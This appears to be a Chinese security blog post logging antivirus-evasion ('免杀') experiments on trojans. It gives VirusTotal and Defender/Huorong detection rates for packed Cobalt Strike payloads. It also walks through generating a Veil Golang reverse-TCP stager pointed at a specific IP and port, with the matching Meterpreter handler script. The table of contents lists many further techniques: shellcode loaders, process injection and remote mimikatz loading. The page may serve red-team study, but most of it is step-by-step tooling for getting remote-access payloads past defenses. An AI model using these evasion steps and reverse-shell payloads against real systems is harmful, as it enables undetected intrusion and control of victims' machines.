<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="常规木马免杀处理-查杀情况记录cs木马免杀比例exe64       41&#x2F;72exe32       40&#x2F;72 +upx之后 123cs64           30&#x2F;72       能过火绒    无法过windows defender自解压打包后    23&#x2F;71       能过火绒    无法过windows defender   （success）cs86">
<meta property="og:type" content="article">
<meta property="og:title" content="常规木马免杀处理-查杀情况记录">
<meta property="og:url" content="https://fdlucifer.github.io/2020/10/09/avbypass/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="常规木马免杀处理-查杀情况记录cs木马免杀比例exe64       41&#x2F;72exe32       40&#x2F;72 +upx之后 123cs64           30&#x2F;72       能过火绒    无法过windows defender自解压打包后    23&#x2F;71       能过火绒    无法过windows defender   （success）cs86">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-10-09T07:44:11.000Z">
<meta property="article:modified_time" content="2020-10-16T04:07:37.377Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://fdlucifer.github.io/2020/10/09/avbypass/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/10/09/avbypass/","path":"2020/10/09/avbypass/","title":"常规木马免杀处理-查杀情况记录"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>常规木马免杀处理-查杀情况记录 | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">54</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">212</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E5%A4%84%E7%90%86-%E6%9F%A5%E6%9D%80%E6%83%85%E5%86%B5%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">常规木马免杀处理-查杀情况记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cs%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%AF%94%E4%BE%8B"><span class="nav-number">1.0.1.</span> <span class="nav-text">cs木马免杀比例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#veil"><span class="nav-number">1.0.2.</span> <span class="nav-text">veil</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf-apk"><span class="nav-number">1.0.3.</span> <span class="nav-text">msf apk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msfvenom-%E6%8D%86%E7%BB%91-%E7%BC%96%E7%A0%81%E5%99%A8%E5%85%8D%E6%9D%80"><span class="nav-number">1.0.4.</span> <span class="nav-text">msfvenom 捆绑+编码器免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95byob%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C-python2"><span class="nav-number">1.0.5.</span> <span class="nav-text">尝试byob僵尸网络(python2)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unicron"><span class="nav-number">1.0.6.</span> <span class="nav-text">unicron</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gobindshell-%EF%BC%88success%EF%BC%89"><span class="nav-number">1.0.7.</span> <span class="nav-text">gobindshell  （success）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go-shellcode"><span class="nav-number">1.0.8.</span> <span class="nav-text">go-shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode-launcher-x"><span class="nav-number">1.0.9.</span> <span class="nav-text">shellcode-launcher(x)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#k8-scrun"><span class="nav-number">1.0.10.</span> <span class="nav-text">k8 scrun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go-meterpreter"><span class="nav-number">1.0.11.</span> <span class="nav-text">go_meterpreter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDmimikatz%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">1.0.12.</span> <span class="nav-text">powershell远程加载mimikatz读取密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SimpleShellcodeInjector%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-number">1.0.13.</span> <span class="nav-text">SimpleShellcodeInjector加载器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#py%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.0.14.</span> <span class="nav-text">py加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go%E5%86%85%E8%81%94c%E5%8A%A0%E8%BD%BD-go%E5%B5%8C%E5%85%A5shellcode"><span class="nav-number">1.0.15.</span> <span class="nav-text">go内联c加载+go嵌入shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go-AES-shellcode-success"><span class="nav-number">1.0.16.</span> <span class="nav-text">go-AES-shellcode (success)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E5%85%A5shellcode"><span class="nav-number">1.0.17.</span> <span class="nav-text">插入shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CPLResourceRunner"><span class="nav-number">1.0.18.</span> <span class="nav-text">CPLResourceRunner</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell%E5%8A%A0%E8%BD%BD-MMFml"><span class="nav-number">1.0.19.</span> <span class="nav-text">powershell加载(MMFml)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lolbins%E7%99%BD%E5%88%A9%E7%94%A8%E5%8A%A0%E8%BD%BDshellcode"><span class="nav-number">1.0.20.</span> <span class="nav-text">Lolbins白利用加载shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmic"><span class="nav-number">1.0.21.</span> <span class="nav-text">wmic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#csc"><span class="nav-number">1.0.22.</span> <span class="nav-text">csc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C-xor-shellcodewrapper"><span class="nav-number">1.0.23.</span> <span class="nav-text">C# xor shellcodewrapper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#py-Base64-k8"><span class="nav-number">1.0.24.</span> <span class="nav-text">py Base64(k8)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#py-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="nav-number">1.0.25.</span> <span class="nav-text">py 十六进制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode-encoder"><span class="nav-number">1.0.26.</span> <span class="nav-text">shellcode_encoder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BE%E4%BE%8Bmsfvenom"><span class="nav-number">1.0.27.</span> <span class="nav-text">举例msfvenom</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%A8%A1%E6%9D%BF%E5%92%8C%E7%BC%96%E7%A0%81%E5%99%A8"><span class="nav-number">1.0.28.</span> <span class="nav-text">使用模板和编码器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-Obfuscation"><span class="nav-number">1.0.29.</span> <span class="nav-text">Invoke-Obfuscation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#the-backdoor-factory"><span class="nav-number">1.0.30.</span> <span class="nav-text">the-backdoor-factory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%B8%B8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5shellcode"><span class="nav-number">1.0.31.</span> <span class="nav-text">正常进程注入shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#golang%E5%8A%A0%E8%BD%BD%E5%BC%82%E6%88%96%E7%9A%84shellcode"><span class="nav-number">1.0.32.</span> <span class="nav-text">golang加载异或的shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cpp-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88failed%EF%BC%89"><span class="nav-number">1.0.33.</span> <span class="nav-text">.cpp shellcode加载器（failed）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HERCULES"><span class="nav-number">1.0.34.</span> <span class="nav-text">HERCULES</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Slackor"><span class="nav-number">1.0.35.</span> <span class="nav-text">Slackor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARCANUS"><span class="nav-number">1.0.36.</span> <span class="nav-text">ARCANUS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TheFatRat"><span class="nav-number">1.0.37.</span> <span class="nav-text">TheFatRat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#avoidz"><span class="nav-number">1.0.38.</span> <span class="nav-text">avoidz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zirikatu"><span class="nav-number">1.0.39.</span> <span class="nav-text">zirikatu</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AVIator"><span class="nav-number">1.0.40.</span> <span class="nav-text">AVIator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DKMC%EF%BC%88%E5%86%85%E7%BD%91%E7%BD%91%E6%AE%B5%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="nav-number">1.0.41.</span> <span class="nav-text">DKMC（内网网段使用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-Rootkit"><span class="nav-number">1.0.42.</span> <span class="nav-text">Python-Rootkit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Beacon-%E7%BB%95%E8%BF%87windows-defender"><span class="nav-number">1.0.43.</span> <span class="nav-text">Beacon-绕过windows defender</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#virustotal%E5%9C%A8%E7%BA%BF%E6%9C%A8%E9%A9%AC%E6%A3%80%E6%B5%8B"><span class="nav-number">1.1.</span> <span class="nav-text">virustotal在线木马检测</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">212</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">54</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/10/09/avbypass/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="常规木马免杀处理-查杀情况记录 | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          常规木马免杀处理-查杀情况记录
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-10-09 15:44:11" itemprop="dateCreated datePublished" datetime="2020-10-09T15:44:11+08:00">2020-10-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2020-10-16 12:07:37" itemprop="dateModified" datetime="2020-10-16T12:07:37+08:00">2020-10-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index"><span itemprop="name">免杀</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>10k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>37 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="常规木马免杀处理-查杀情况记录"><a href="#常规木马免杀处理-查杀情况记录" class="headerlink" title="常规木马免杀处理-查杀情况记录"></a>常规木马免杀处理-查杀情况记录</h1><h3 id="cs木马免杀比例"><a href="#cs木马免杀比例" class="headerlink" title="cs木马免杀比例"></a>cs木马免杀比例</h3><p>exe64       41&#x2F;72<br>exe32       40&#x2F;72</p>
<p>+upx之后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cs64           30/72       能过火绒    无法过windows defender</span><br><span class="line">自解压打包后    23/71       能过火绒    无法过windows defender   （success）</span><br><span class="line">cs86           45/72       被火绒查杀  无法过windows defender</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="veil"><a href="#veil" class="headerlink" title="veil"></a>veil</h3><p>安装docker:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">添加Docker PGP key:</span><br><span class="line">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">配置Docker APT repository：</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list</span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line">apt-get remove docker docker-engine docker.io</span><br><span class="line">apt-get install docker-ce</span><br><span class="line"></span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>

<p>安装拉取veil镜像：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt -y install veil</span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">镜像地址：</span><br><span class="line">https://hub.docker.com/r/mattiasohlsson/veil/</span><br><span class="line"></span><br><span class="line">mousepad /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;https://1nj0zren.mirror.aliyuncs.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://f1361db2.m.daocloud.io&quot;</span>,</span><br><span class="line">        <span class="string">&quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line">docker pull mattiasohlsson/veil</span><br><span class="line"></span><br><span class="line">启动docker:</span><br><span class="line"></span><br><span class="line">-v /tmp/veil-output:/var/lib/veil/output:Z是将宿主机的/tmp/veil-output目录映射到docker里面，这样veil生成的payload可以直接在宿主机里使用。</span><br><span class="line"></span><br><span class="line">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<p>veil有两个免杀的工具，Evasion和Ordnance。<br>Ordnance可生成在Veil-Evasion中使用的shellcode，Evasion是用做文件免杀。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Veil&gt;: use 1                   <span class="comment">#选择Evasion功能</span></span><br><span class="line">Veil/Evasion&gt;: list            <span class="comment">#查看payload列表</span></span><br></pre></td></tr></table></figure>

<p>veil直接生成exe</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Veil/Evasion&gt;: use 16</span><br><span class="line">Name:          Pure Golang Reverse TCP Stager</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lhost 45.32.137.154</span><br><span class="line"><span class="built_in">set</span> lport 4466</span><br><span class="line">generate</span><br><span class="line"></span><br><span class="line">root@kali:/tmp/veil-output<span class="comment"># tree</span></span><br><span class="line">.</span><br><span class="line">├── catapult</span><br><span class="line">├── compiled</span><br><span class="line">│   └── go_msf.exe</span><br><span class="line">├── handlers</span><br><span class="line">│   └── go_msf.rc</span><br><span class="line">├── hashes.txt</span><br><span class="line">└── <span class="built_in">source</span></span><br><span class="line">    └── go_msf.go</span><br><span class="line"></span><br><span class="line">root@kali:/tmp/veil-output<span class="comment"># cat handlers/go_msf.rc </span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 45.32.137.154</span><br><span class="line"><span class="built_in">set</span> LPORT 4466</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<p>生成的exe文件被查杀火绒，upx加壳依然被火绒查杀，尴尬</p>
<p>加upx后         virustotal查杀率             37&#x2F;68</p>
<ul>
<li>veil+mingw+w64（success）</li>
</ul>
